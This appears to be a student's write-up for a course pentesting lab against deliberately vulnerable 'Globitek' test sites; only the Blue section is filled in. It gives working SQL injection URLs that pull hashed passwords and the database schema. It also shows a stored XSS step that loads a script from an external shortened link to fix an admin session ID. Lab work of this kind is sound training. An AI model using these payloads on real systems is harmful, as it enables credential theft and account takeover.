# Project 8 - Pentesting Live Targets

Time spent: **X** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: SQL Injection (SQLi)<br />  
    ![GIF Walkthrough](./img/B1.gif)<br />  
    Steps to recreate:
- Go to the salespearson page https://104.198.208.81/blue/public/salesperson.php?id=1
- Replace the id parameter with a single quote ```'```.<br />
Example: ```https://104.198.208.81/blue/public/salesperson.php?id='```
- After the quote type url encoded SQL command.<br />
Example: ```https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Chashed_password+FROM+users+limit+20+offset+2+--+```
- You can interate through the records by changing the ```LIMIT``` and ```OFFSET``` values
- Some of the example commands:<br />```https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Cdatabase()+--+
https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Ctable_name+FROM+information_schema.tables+where+table_schema%3D%27globitek_blue%27+limit+20+offset+2+--+
https://35.184.88.145/blue/public/salesperson.php?id=%27+union+select+1%2C2%2C3%2C4%2Ccolumn_name+FROM+information_schema.columns+where+table_schema%3D%27globitek_blue%27+limit+20+offset+2+--+```

- Data collected:
    - Database: globitek_blue
    - Tables:
        - users
        - territories
        - states
        - salespeople_territories
        - salespeople
        - failed_logins
        - countries
        - feedback
    - Columns
        - id
        - name
        - code
        - username
        - count
        - last_attempt
        - email
        - feedback
        - created_at
        - first_name
        - last_name
        - phone
        - territory_id
        - salesperson_id
        - country_id
        - state_id
        - position
        - hashed_password

Vulnerability #2: Session Hijacking/Fixation<br />  
    ![GIF Walkthrough](./img/B2short.gif)<br />  
    Steps to recreate:
- When logged in as an admin go to "Countries, States, & Territories".
- Click on "Show", doesn't matter which country.
- Click on "Add a State".
- Enter values for "Name" and "Code" and click create.
- Click on "Add a Territory".
- Ender a value for "Name".
- In the filed "Position" type:
  ```html
        <script src="https://bit.ly/2z1UCVh"></script>
  ```  
  https://bit.ly/2z1UCVh is a shortened link for a <a href="./js_scripts/Untitled-8.js">js script</a> hosted on GoogeDrive
- Sign in again to the website as an admin
- Now the owner on PHPSESSID hardcoded in js script is logged into the website as an admin  
This is possible because new PHPSESSID is not generated when a used logs into website



## Green

Vulnerability #1: __________________

Vulnerability #2: __________________


## Red

Vulnerability #1: __________________

Vulnerability #2: __________________


## Notes

Describe any challenges encountered while doing the work
